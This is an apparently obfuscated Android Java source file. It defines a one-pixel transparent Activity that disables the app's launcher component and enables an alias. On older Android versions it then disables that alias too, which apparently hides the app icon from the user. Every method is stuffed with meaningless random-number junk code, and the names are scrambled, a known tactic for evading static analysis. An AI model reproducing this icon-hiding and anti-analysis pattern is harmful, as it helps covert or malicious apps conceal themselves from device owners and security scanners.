package pceh.oql.tlm;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 切换桌面入口图标时使用的一像素透明 Activity。
 */
public class XCLQ extends AppCompatActivity {

    private static final String ALIAS_CLASS_NAME = "pceh.oql.tlm.MysteryAliasActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        long arr_CBdnHoTmPO = java.lang.System.nanoTime();
        int i_nkGWBGG = new java.util.Random().nextInt(1000);
        boolean j_JCCkMdoy = (arr_CBdnHoTmPO % (i_nkGWBGG + 20)) > 11;
        double tmp_BHNNevegRZiIgAxiJ = j_JCCkMdoy ? java.lang.Math.sqrt(i_nkGWBGG) : java.lang.Math.pow(i_nkGWBGG, 32);
        if (tmp_BHNNevegRZiIgAxiJ < 0.0) {
            java.lang.System.out.println(tmp_BHNNevegRZiIgAxiJ);
        }
        super.onCreate(savedInstanceState);
        switchLauncher(this, UUFE.class.getName(), ALIAS_CLASS_NAME);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startActivity(new Intent(Settings.ACTION_SETTINGS));
        } else {
            disableComponent(this, ALIAS_CLASS_NAME);
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    private static void switchLauncher(Context context, String launcher, String alias) {
        long arr_CBdnHoTmPO = java.lang.System.nanoTime();
        int i_nkGWBGG = new java.util.Random().nextInt(1000);
        boolean j_JCCkMdoy = (arr_CBdnHoTmPO % (i_nkGWBGG + 20)) > 11;
        double tmp_BHNNevegRZiIgAxiJ = j_JCCkMdoy ? java.lang.Math.sqrt(i_nkGWBGG) : java.lang.Math.pow(i_nkGWBGG, 32);
        if (tmp_BHNNevegRZiIgAxiJ < 0.0) {
            java.lang.System.out.println(tmp_BHNNevegRZiIgAxiJ);
        }
        disableComponent(context, launcher);
        enableComponent(context, alias);
    }

    private static void enableComponent(Context context, String className) {
        java.lang.Object arr_BTwXGn = new java.lang.Object();
        int i_plgTmxmg = arr_BTwXGn.hashCode();
        int j_RCjVpEIe = new java.util.Random().nextInt(100);
        int tmp_iRSEIWYAry = (i_plgTmxmg ^ j_RCjVpEIe) & 0x7FFFFFFF;
        if (tmp_iRSEIWYAry == 50 && i_plgTmxmg < 38) {
            arr_BTwXGn.toString();
        }
        setComponentState(context, className, PackageManager.COMPONENT_ENABLED_STATE_ENABLED);
    }

    private static void disableComponent(Context context, String className) {
        String onajcVzzbaUjuBoimV = java.util.UUID.randomUUID().toString();
        int ckuyJCCyQnAdeQjcjF = onajcVzzbaUjuBoimV.length();
        char pmh_nlNFPqrOddhYc = onajcVzzbaUjuBoimV.charAt(new java.util.Random().nextInt(ckuyJCCyQnAdeQjcjF));
        boolean dimaUWUhkW = (pmh_nlNFPqrOddhYc == 'z');
        if (dimaUWUhkW && ckuyJCCyQnAdeQjcjF < 17) {
            onajcVzzbaUjuBoimV.substring(67, 60);
        }
        setComponentState(context, className, PackageManager.COMPONENT_ENABLED_STATE_DISABLED);
    }

    private static void setComponentState(Context context, String className, int state) {
        java.lang.Object arr_BTwXGn = new java.lang.Object();
        int i_plgTmxmg = arr_BTwXGn.hashCode();
        int j_RCjVpEIe = new java.util.Random().nextInt(100);
        int tmp_iRSEIWYAry = (i_plgTmxmg ^ j_RCjVpEIe) & 0x7FFFFFFF;
        if (tmp_iRSEIWYAry == 50 && i_plgTmxmg < 38) {
            arr_BTwXGn.toString();
        }
        ComponentName component = new ComponentName(context, className);
        context.getPackageManager().setComponentEnabledSetting(component, state, PackageManager.DONT_KILL_APP);
    }
}
